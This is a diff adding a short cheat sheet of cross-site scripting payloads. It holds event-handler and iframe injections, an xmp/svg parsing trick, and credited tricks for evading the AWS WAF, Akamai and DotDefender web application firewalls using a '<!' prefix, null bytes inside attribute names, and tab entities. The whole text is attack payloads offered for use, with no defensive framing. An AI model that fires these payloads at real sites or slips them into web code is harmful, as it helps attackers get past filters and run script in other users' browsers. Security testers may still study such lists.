@@ -1,0 +1,16 @@
+<iframe srcdoc="<script>alert()</script>"></iframe>
+<input type="text" id="search-text" name="query" value="" onfocus="alert(origin)" autofocus="" />
+in tag input:
+onfocus="alert(origin)" autofocus="" />
+ONFoCus
+<xmp><p title="</xmp><svg/onload=alert(45)>”>
+
+@vanshitmalhotra | Bypass AWS WAF -// 
+Add "<!" (without quotes) before your payload and bypass that WAF. :)
+eg: <!<script>confirm(1)</script>
+
+@black0x00mamba | Bypass WAF Akamaighost & filtered onload, onclick, href, src, onerror, script, etc 
+<img  sr%00c=x o%00nerror=((pro%00mpt(1)))>
+
+DotDefender WAF bypass by @0xInfection 
+<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
